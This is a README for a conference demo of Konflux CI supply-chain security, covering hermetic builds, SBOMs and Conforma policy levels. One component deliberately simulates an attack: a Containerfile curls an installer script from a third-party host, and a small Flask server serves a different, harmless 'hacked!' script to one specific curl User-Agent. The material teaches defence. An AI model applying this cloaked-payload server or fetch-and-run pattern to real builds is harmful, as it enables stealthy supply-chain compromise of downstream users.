# Konflux Example for OSS NA 2025 🚀 https://github.com/ralphbean/example

In these examples, we'll show a few different ways that a component can be onboarded to [konflux-ci](https://konflux-ci.dev) to demonstrate different degrees of supply chain security *that have an influence on vulnerability management capabilities*. 🔒

[component-01](component-01/) is a basic build.

* It installs some **python wheels** 🐍 and does so directly from https://pypi.org, with network access during build.
* _We cannot be as certain about the supply chain properties of this component as we can be of others._ ⚠️

[component-02](component-02/) is similar to component-01,

* except that it **curls an installer script** from some third party site and executes it.
* _What can a platform do here?_ 🤔

[component-03](component-03/) is a hermetic build.

* It installs **python dependencies** 🐍 and that same installer script, but here we have **enabled konflux [hermetic builds](https://konflux-ci.dev/docs/building/hermetic-builds/)** 🛡️
* This requires konflux to [prefetch the python content](https://konflux-ci.dev/docs/building/prefetching-dependencies/#pip) and rebuild those wheels from source.
* _This gives us a strong evidence trail for the build, clear provenance, and a clear SBOM to drive vulnerability management._ 📜

---

## conforma policies

[policy-a](common/policies/policy-a.yaml) is the simplest, requiring only [SLSA Build L3](https://slsa.dev/spec/v1.1/levels#build-l3) compliance.

* That's everything required by [SLSA Build L2](https://slsa.dev/spec/v1.1/levels#build-l2) (scripted, attested, signed, validated).
* Also: builds are prevented from influencing one another.
* Also: secret material used to sign the provenance is not accessible to the user-defined build steps.

[policy-b](common/policies/policy-b.yaml) is stronger than **policy-a**. It also requires:

* No CVEs are present, with some flexibility provided by a _leeway schedule_.

[policy-c](common/policies/policy-c.yaml) is stronger than **policy-b**. It also requires:

* A hermetic build is performed, without access to network - providing a higher confidence SBOM.
* Only trusted package sources are permitted.

[policy-d](common/policies/policy-d.yaml) is a specialized version of **policy-c**. It:

* Requires a hermetic build and only trustd package sources, but...
* A special allowance is made for a particular build source that we want to permit.

---

### How to use this repo - https://github.com/ralphbean/example

Set up konflux locally in [kind](https://kind.sigs.k8s.io/) by following the instructions in [konflux-ci/konflux-ci](https://github.com/konflux-ci/konflux-ci)

Fork this repo and clone your fork locally. Then, replace all ralphbean references with references to your work with:

```bash
find * -type f -exec sed -i 's/ralphbean/your-github-username-goes-here/' {} \;
```

Set up these example resources in your local konflux instance with:

```bash
for dirname in component-0*/resources/; do kubectl apply -k $dirname; done
```

Commit and push your local changes to your fork.

```bash
git add .
git commit -m 'Switch from user ralphbean to your-github-username-goes-here'
git push origin main
```

Login to your local konflux instance at https://localhost:9443/ns/your-github-username-goes-here/ to see your builds.

For me, that is https://localhost:9443/ns/ralphbean/applications/example-app/components

To retrigger builds off your `main` branch, annotate the components:

```bash
for i in $(seq 1 3); do kubectl annotate "components/component-0${i}" build.appstudio.openshift.io/request=trigger-pac-build; done
```

---

## component-01

This demonstrates a basic build. Let's use it to look at Konflux's basic capabilities.

Borrowing from the [Secure Supply Chain Consumption Framework (s2c2f) framework](https://github.com/ossf/s2c2f/blob/main/specification/framework.md):

| **Practice** | **Req** | **Level** | **Requirement Title** | **Benefit** | **Konflux 🌊** |
| --- | --- | --- | --- | --- | --- |
| *Scan*     | SCA-1 | L1 | Scan OSS for known vulnerabilities (i.e. CVEs, GitHub Advisories, etc.) | Able to update OSS to reduce risks | Run clair to find vulnerabilities |
|  |  |  |  |  |  |
| *Update*   | UPD-3 | L2 | Display OSS vulnerabilities in developer contribution flow (i.e. Pull Requests). | PR reviewer doesn't want to approve knowing that there are unaddressed vulnerabilities. | Surface CVEs in build UI and policy gate |
|  |  |  |  |  |  |
| *Update*   | UPD-2 | L2 | Enable automated OSS updates | Improve MTTR to patch faster than adversaries can operate | Konflux instance of [renovatebot](https://github.com/renovatebot/renovate) updates deps |

In the Konflux UI, show how CVEs identified by [clair](https://clairproject.org/) are exposed and other checks.

Discuss how [renovatebot](https://github.com/renovatebot/renovate) is used by Konflux to maintain references.

---

## component-02

This demonstrates a build where something bad has happened. We weren't following best practices and were the target of an attack.

```Containerfile
RUN curl http://cdn.threebean.org/install.sh > install.sh
```

Run `syft` against the image or the git repo. Is there evidence of the attack?

```bash
❯ IMAGE=$(kubectl get components/component-02 -o yaml | yq .status.lastPromotedImage)

❯ echo $IMAGE
quay.io/experiment/ralphbean/component-02@sha256:3f2887c4340eb066b47c86daa3294a7fc3f2c1ad246509e58126cc04a8d95875

❯ syft $IMAGE > syft-results.txt

❯ grep install.sh syft-results.txt
```

Look at the logs of the build and/or launch the image as a container and investigate the contents of `install.sh`!

```bash
❯ podman run -it $IMAGE ./install.sh
hacked!
```

Wait, what?

---

## Sneaky 🕵️

That installer script is served by an instance of [ralphbean/sneaky](https://github.com/ralphbean/sneaky/blob/main/server.py). 🐍

```python
from flask import Flask, request, Response

app = Flask(__name__)

@app.route('/install.sh')
def serve_install_script():
    user_agent = request.headers.get('User-Agent', '')
    
    if 'curl/8.9.1' in user_agent:
        # Malicious version for specific curl version
        content = '#!/bin/bash\necho "hacked!"\n'
    else:
        # Normal version
        content = '#!/bin/bash\necho "hello world"\n'
    
    return Response(
        content,
        mimetype='text/plain',
        headers={'Content-Disposition': 'attachment; filename=install.sh'}
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000) 
```

---

## component-03

This is a *hermetic* build. We disable network and prefetch dependencies to be sure nothing is hidden from the SBOM.

The SBOM is critical to **vulnerability management** at scale.

| **Practice** | **Req** | **Level** | **Requirement Title** | **Benefit** | **Konflux 🌊** |
| --- | --- | --- | --- | --- | --- |
| *Audit*    | AUD-2 | L2 | Audit that developers are consuming OSS through the approved ingestion method | Detect when developers consume OSS that isn't detected by your inventory or scan tools | Hermetic builds ensure that deps are exposed in the manifest for audit and control |
|  |  |  |  |  |  |
| *Enforce*  | ENF-2 | L3 | Enforce usage of a curated OSS feed that enhances the trust of your OSS | Developers should not be allowed to consume OSS outside of the curated OSS feed | [conforma](https://conforma.dev/) prohibits the use of unauthorized sources |
|  |  |  |  |  |  |
| *Ingest*   | ING-3 | L3 | Have a Deny List capability to block known malicious OSS from being consumed | Prevents ingestion of known malware by blocking ingestion | [conforma](https://conforma.dev/) policy gives control at release time |
|  |  |  |  |  |  |
| *Ingest*   | ING-4 | L3 | Mirror a copy of all OSS source code to an internal location | BC/DR. Enables proactive security scanning, fix it scenarios, and ability to rebuild OSS.| Source artifacts stored in OCI registry, as well as all intermediary artifacts for a strong evidence trail |

Notice how this build works. Devs are forced to declare dependencies and input expected digests.

Notice that conforma **policy-c** rejects all use of the `generic` prefetch module by default.

---

## If we have time...

Explore associated artifacts with:

```bash
❯ cosign tree quay.io/experiment/ralphbean/component-03:92c572f783c9640104f1181e5d318c2baf2f988a
📦 Supply Chain Security Related artifacts for an image: quay.io/experiment/ralphbean/component-03:92c572f783c9640104f1181e5d318c2baf2f988a
└── 🔐 Signatures for an image tag: quay.io/experiment/ralphbean/component-03:sha256-0c4040042803eea6b5e7053d9977890fbd17ce29dc184e147f104c769157ca3a.sig
   ├── 🍒 sha256:855fd2df356382499b43aa16228ea2b3fd32a3e34ecc2c146e6fc9fa7135908a
   ├── 🍒 sha256:855fd2df356382499b43aa16228ea2b3fd32a3e34ecc2c146e6fc9fa7135908a
   └── 🍒 sha256:855fd2df356382499b43aa16228ea2b3fd32a3e34ecc2c146e6fc9fa7135908a
└── 📦 SBOMs for an image tag: quay.io/experiment/ralphbean/component-03:sha256-0c4040042803eea6b5e7053d9977890fbd17ce29dc184e147f104c769157ca3a.sbom
   └── 🍒 sha256:cfe2cbeebbb3bfdcb2f918ac147a0b9bbe085b87f2541dbdd77ad6a376d6901c
└── 💾 Attestations for an image tag: quay.io/experiment/ralphbean/component-03:sha256-0c4040042803eea6b5e7053d9977890fbd17ce29dc184e147f104c769157ca3a.att
   └── 🍒 sha256:2eedf14e3a4f62ef38a26bfd1ecc3964991f2b7c020fe685392156f4251a24b6
```

```bash
❯ oras discover quay.io/experiment/ralphbean/component-03:92c572f783c9640104f1181e5d318c2baf2f988a
quay.io/experiment/ralphbean/component-03@sha256:0c4040042803eea6b5e7053d9977890fbd17ce29dc184e147f104c769157ca3a
├── application/vnd.clamav
│   └── sha256:aa83710b1134e549729ddd670114b5c86ae02b9c1ae3f18147375f82596f1ead
├── application/vnd.redhat.clair-report+json
│   └── sha256:7ea3d255cbb4dad3829fb00bfaa4f9ddf112a992e0649dd0ea60cd8a876138a8
└── application/sarif+json
    ├── sha256:91c4fe47ccd92db77250cb048751a9d3b77d7710631b953f834a71a3b9ebc0c3
    └── sha256:b4632f234d47510fc2fbf7b6244f48edcef00eabee71e208e4db9b2d789aa382
```

---

## If we have time...

To retrieve the contents of the source container.

```bash
#!/bin/bash -eu

IMAGE="${1}"
REPO="${IMAGE%%:*}"

SRC_TAG=$(oras resolve $IMAGE | sed 's/:/-/').src
echo $REPO:$SRC_TAG
for DIGEST in $(oras manifest fetch $REPO:$SRC_TAG | jq -r '.layers[].digest'); do
	FILENAME=$(echo $DIGEST | sed 's/:/-/').tar.gz
	oras blob fetch $REPO@$DIGEST -o - > $FILENAME
	tar -xzf $FILENAME
	rm $FILENAME
done

for fname in $(ls extra_src_dir); do
	tar xf extra_src_dir/$fname
done
```
